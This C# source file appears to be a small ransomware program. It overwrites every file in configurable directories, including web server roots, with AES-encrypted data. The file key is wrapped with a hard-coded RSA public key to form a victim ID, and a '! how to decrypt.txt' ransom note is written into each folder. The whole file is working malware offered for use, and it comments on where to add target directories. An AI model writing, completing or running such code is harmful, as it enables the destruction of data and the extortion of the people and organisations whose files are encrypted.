using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace rf_rw
{
    class Program
    {
        static string public_key_xml = "<RSAKeyValue><Modulus>yfOCfCh0e4AuXziB7yG6qMeIZ2iNCQaPEQPdNfxJ6RJPEhYxPgHI55XT+uVjtZpcatpgnETPT7YtYXbosPLY+VrXT1qcNiH21h5q/PrT6Q0X5Q9EFYbETo0XSLFrjwv6D9TWWz2G4fDtTqDmOvq+B4f+nLKqZ74qMcGOWm+D9OE=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"; // the public xml RSA public key, used to generate ID
        static string decrypt_file_text = $"Your system is now encrypted ... \n\nyour ID:\n%ID%"; // text inside "how_to_decrypt.txt" file
        static string ID = "N/A"; // id used to gain key used to encrypt via RSA

        static string[] dirs =
        {
            "/var/www/html/main_web",
            "/var/www/html/website2",
            "/usr/share/confidential_info"
            //Add your directories.
        };

        static void Main(string[] args)
        {
            Console.Write("password: ");
            if(md5(ReadLineMasked()) != "386216eed96bd2b4a3febe7beeacec5f") // password check in case of involuntary execution (default pass: Xqm3LvC8)
            {
                Console.WriteLine("wrong password");
                Environment.Exit(0);
            }


            string encryption_key = random_string(16); // generate key used to encrypt data [avoid big length (keep under 32)]
            ID = RSAEncrypt(public_key_xml, encryption_key); // create the unique encryption identification

            foreach (string dir in dirs) // iterate with every directory listed into the "dirs" string array
            {
                Thread.Sleep(1000);
                Console.WriteLine("encrypting: " + dir);
                new Thread(() => { encrypt_dir(dir, encryption_key); }).Start(); // attempts to encrypt the current directory
            }

            Console.WriteLine("Done encrypting.");
        }

        #region methods
        static Random rnd = new Random();
        public static string RSAEncrypt(string public_key, string text)
        {
            using (var RSA = new RSACryptoServiceProvider(1024))
            {
                try
                {
                    RSA.FromXmlString(public_key);
                    var RSAEncode = RSA.Encrypt(Encoding.UTF8.GetBytes(text), true);
                    var B64Encode = Convert.ToBase64String(RSAEncode);
                    return B64Encode;
                }
                finally
                {
                    RSA.PersistKeyInCsp = false;
                }
            }
        } // unknown resource
        public static string md5(string input)
        {
            using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
            {
                byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < hashBytes.Length; i++) { sb.Append(hashBytes[i].ToString("X2")); }
                return sb.ToString().ToLower();
            }
        } // unknown resource
        public static string ReadLineMasked(char mask = '*')
        {
            var sb = new StringBuilder();
            ConsoleKeyInfo keyInfo;
            while ((keyInfo = Console.ReadKey(true)).Key != ConsoleKey.Enter)
            {
                if (!char.IsControl(keyInfo.KeyChar))
                {
                    sb.Append(keyInfo.KeyChar);
                    Console.Write(mask);
                }
                else if (keyInfo.Key == ConsoleKey.Backspace && sb.Length > 0)
                {
                    sb.Remove(sb.Length - 1, 1);

                    if (Console.CursorLeft == 0)
                    {
                        Console.SetCursorPosition(Console.BufferWidth - 1, Console.CursorTop - 1);
                        Console.Write(' ');
                        Console.SetCursorPosition(Console.BufferWidth - 1, Console.CursorTop - 1);
                    }
                    else Console.Write("\b \b");
                }
            }
            Console.WriteLine();
            return sb.ToString();
        }  // https://stackoverflow.com/questions/3404421/password-masking-console-application
        static string random_string(int length)
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[length];

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[rnd.Next(chars.Length)];
            }

            return new String(stringChars);
        } // unknown resource
        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        } // unknown resource
        public static void EncryptFile(string file, string password)
        {

            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

            // Hash the password with SHA256
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

            string fileEncrypted = file;

            File.WriteAllBytes(fileEncrypted, bytesEncrypted);
        } // unknown resource
        static void encrypt_dir(string dir, string password)
        {
            try
            {
                string[] files = Directory.GetFiles(dir, "*", SearchOption.AllDirectories);

                foreach (string file in files)
                {
                    string tdir = Path.GetDirectoryName(file);
                    if (!File.Exists(tdir + "/! how to decrypt.txt")) // create file with instructions on how to decrypt
                    {
                        File.WriteAllText(tdir + "/! how to decrypt.txt", decrypt_file_text.Replace("%ID%", ID));
                    }

                    EncryptFile(file, password);
                }
            }
            catch { }
        } // unknown resource
        #endregion


    }
}
